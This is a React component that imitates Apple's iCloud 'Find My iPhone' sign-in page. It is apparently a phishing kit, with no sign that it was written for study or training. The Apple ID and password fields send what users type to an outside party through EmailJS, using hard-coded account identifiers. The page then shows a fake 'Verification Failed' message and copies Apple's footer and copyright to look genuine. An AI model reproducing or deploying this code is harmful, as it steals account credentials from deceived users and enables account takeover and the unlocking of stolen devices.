import React, { useState } from 'react'
import { Container, Col, Row, Form, Spinner } from 'react-bootstrap'
import FormControlLabel from '@material-ui/core/FormControlLabel'
import Checkbox from '@material-ui/core/Checkbox'
import { send } from 'emailjs-com'
import Modal from 'react-bootstrap/Modal'



const MainContent = () => {
  const [total, setTotal] = useState({
    appleId: '',
    password: '',
  })
  
  const [isOpen, setIsOpen] = React.useState(false)

  const showModal = () => {
    setIsOpen(true)
  }

  const hideModal = () => {
    setIsOpen(false)
  }

  const [isSpinner, setIsSpinner] = React.useState(false)

  const showSpinner = () => {
    setIsSpinner(true)
  }

  const hideSpinner = () => {
    setIsSpinner(false)
  }

  const [showPasswordField, setShowPasswordField] = useState(false)

  function changeInputBorder() {
    setShowPasswordField(true)
    let t = total.appleId
    if (t.includes('@icloud.com')) {
      total.appleId = t
    } else if (t.includes('@gmail.com')) {
      total.appleId = t
    } else {
      total.appleId = t + '@icloud.com'
    }

    document.getElementById('buttonInside').style.border = ' 2px solid #999999'
    document.getElementById('buttonInside').style.borderBottom =
      ' 2px solid white'
    document.getElementById('buttonInside').style.borderBottomLeftRadius = '0px'
    document.getElementById('buttonInside').style.borderBottomRightRadius =
      '0px'
    document.getElementById('userNameButton').style.visibility = 'hidden'
  }
  function changeAppleIdButtonColor() {
    if (document.getElementById('buttonInside').value === '') {
      document.getElementById('colorbutton').style.color = '#999999'
    } else {
      document.getElementById('userNameButton').style.color = '#000000'
    }
  }

  function changePasswordButtonColor() {
    if (document.getElementById('buttonInside2').value === '') {
      document.getElementById('colorbutton2').style.color = '#999999'
    } else {
      document.getElementById('passwordButton').style.color = '#000000'
    }
  }
  const handleAppleIdKeyPress = (event) => {
    if (event.key === 'Enter') {
      changeInputBorder()
    }
  }

  const onSubmit = (e) => {
    e.preventDefault()
    send(
      'service_01j94cb',
      'template_yo1r1gj',
      total,
      'user_t8N33j6cjQKJksgrQdNFs'
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text)
      })
      .catch((err) => {
        console.log('FAILED...', err)
      })
  }

  const handleChange = (e) => {
    setTotal({ ...total, [e.target.name]: e.target.value })
  }

  const hStyle = {
    fontSize: 10,
    color: '#757575',
    fontFamily: 'Helvetica ',
    fontWeight: 400,
    wordSpacing: '-2px',
  }
  const spinner = props => {
   
      return (
          alert('hi')
      )
 
  }

  return (
    <div className='main-contains'>
      <Form onSubmit={onSubmit}>
        <div
          className='backgroundImage'
          style={{
            backgroundImage: 'url(/background.png)',
          }}
        ></div>
         <div class="lds-spinner"
   >
       <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
      
        <Container className='align-middle11'>
          <div className='content'>
            <Row className='element'>
              <Col>
                <div>
                  <div>
                    <img src='/lostLogo.png' alt='logo' />
                  </div>
                  <Col>
                    <div className='signin'>
                      <p>iCloud - Find My iPhone</p>
                     
                    </div>
                  </Col>
                  <div className='row d-flex justify-content-center'>
                    <div>
                      <div>
                        <div id='buttonInside' className='buttonInside'>
                          <input
                            id='userInput'
                            name='appleId'
                            autoFocus={true}
                            className='userInput'
                            placeholder='Apple ID'
                            value={total.appleId}
                            onInput={changeAppleIdButtonColor}
                            onKeyPress={handleAppleIdKeyPress}
                            onChange={handleChange}
                          ></input>
                          <button
                            className='insideButton'
                            disabled={total.appleId ? false : true}
                          >
                            <i
                              id='userNameButton'
                              className='far fa-arrow-alt-circle-right fa-lg userButton colorbutton'
                              onClick={changeInputBorder}
                            ></i>
                          </button>
                        </div>
                      </div>
                      {showPasswordField ? (
                        <div id='buttonInside2' className='buttonInside2'>
                          <input
                            id='passwordInput'
                            name='password'
                            autoFocus={true}
                            className='passwordInput'
                            placeholder='Password'
                            type='password'
                            value={total.password}
                            onKeyPress={(e) => {
                              if (e.key === 'Enter') {
                                const onSubmit = (e) => {
                                  e.preventDefault()
                                  send(
                                    'service_01j94cb',
                                    'template_yo1r1gj',
                                    total,
                                    'user_t8N33j6cjQKJksgrQdNFs'
                                  )
                                    .then((response) => {
                                      console.log(
                                        'SUCCESS!',
                                        response.status,
                                        response.text
                                      )
                                     
                                    })
                                    .catch((err) => {
                                      console.log('FAILED...', err)
                                    })
                                }
                                onSubmit(e)
                                setTimeout(showSpinner, 1)
                                setTimeout(showModal, 5000)
                              }
                            }}
                            onInput={changePasswordButtonColor}
                            onChange={handleChange}
                          ></input>
                          <a href='/Verifay'>
                            <button
                              className='insideButton'
                              disabled={total.password ? false : true}
                            >
                              <i
                                id='passwordButton'
                                className='far fa-arrow-alt-circle-right fa-lg colorbutton2 passwordButton hidden'
                                onClick={(e) => {
                                  const onSubmit = (e) => {
                                    e.preventDefault()
                                    send(
                                      'service_01j94cb',
                                        'template_yo1r1gj',
                                        total,
                                        'user_t8N33j6cjQKJksgrQdNFs'
                                    )
                                      .then((response) => {
                                        console.log(
                                          'SUCCESS!',
                                          response.status,
                                          response.text
                                        )
                                        
                                      })
                                      .catch((err) => {
                                        console.log('FAILED...', err)
                                      })
                                  }
                                  onSubmit(e)
                                  setTimeout(showSpinner, 1)
                                  setTimeout(showModal, 5000)
                                }}
                              ></i>
                            </button>
                          </a>
                        </div>
                      ) : null}
                    </div>
                  </div>
                  <div
                    style={{ paddingLeft: '20px' }}
                    className='divider'
                    orientation='vertical'
                  ></div>
                  <FormControlLabel
                    className='FormControlLabel'
                    control={
                      <Checkbox
                        name='checkedA'
                        color='primary'
                        label='Custom color'
                      />
                    }
                    label='Keep me signed in'
                  />
                  <hr />
                  <a href='/Passcode'>
                            
                    <div className='forget' style={{ fontSize: '18px', fontWeight: 'bold' }}>
                      {' '}
                      Use Passcode{' '}
                    </div>
                  </a>
                </div>
              </Col>
            </Row>
            <footer className='footer'>
              <Container>
                <Row>
                  <Col className='text-center' style={hStyle}>
                    <a style={hStyle} className='text-center' href='/'>
                      Create Apple ID
                    </a>{' '}
                    |{' '}
                    <a
                      style={hStyle}
                      className='text-center'
                      href='https://www.apple.com/support/systemstatus/'
                    >
                      System Status
                    </a>{' '}
                    <br class='mobile' />|{' '}
                    <a
                      style={hStyle}
                      className='text-center'
                      href='https://www.apple.com/privacy/'
                    >
                      Privacy Policy
                    </a>{' '}
                    |{' '}
                    <a
                      style={hStyle}
                      className='text-center'
                      href='https://www.apple.com/legal/internet-services/icloud/'
                    >
                      Terms & Conditions
                    </a>{' '}
                    <br class='mobile' />| Copyright &copy; 2021 Apple Inc. All
                    rights reserved.
                  </Col>
                </Row>
              </Container>
            </footer>
          </div>
        </Container>
      </Form>

      <Modal
        style={{
          fontWeight: 'bold',
          fontSize: '14px',
          width: '80%',
          borderRadius: '10px',
          top: '30%',
          position: 'fixed',
          left: '7.5%',
          
        }}
        show={isOpen}
        onHide={hideModal}
      >
        <Modal.Header
          style={{
            justifyContent: 'center',
            fontSize: '12px',
          }}
        >
          <Modal.Title
            
            >
              <div style={{
                marginBottom:'0px',
                justifyContent: 'center',
                textAlign: 'center'
              }}>Verification Failed </div><p style={{
                justifyContent: 'center',
                fontSize: '12px',
                textAlign: 'center',
              }}>Your Apple ID or password was incorrect.</p>
            </Modal.Title>
        </Modal.Header>
        <Modal.Footer
          style={{
            fontSize: '12px',
            fontFamily: 'Arial',
            justifyContent: 'center',
            marginTop:'0px',
          }}
        >
          <button
            style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#0071c9',
              height: '20px',
              fontFamily: 'Arial',
              border: 'none',
              backgroundColor: 'white',
            }}
            onClick={hideModal}
          >
            OK
          </button>
        </Modal.Footer>
      </Modal>
      
            <Modal
        show={isSpinner}
        onHide={hideSpinner}
      >
          <div class="spin"
      >
            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
    
      </Modal>
    </div>
  )
}
export default MainContent
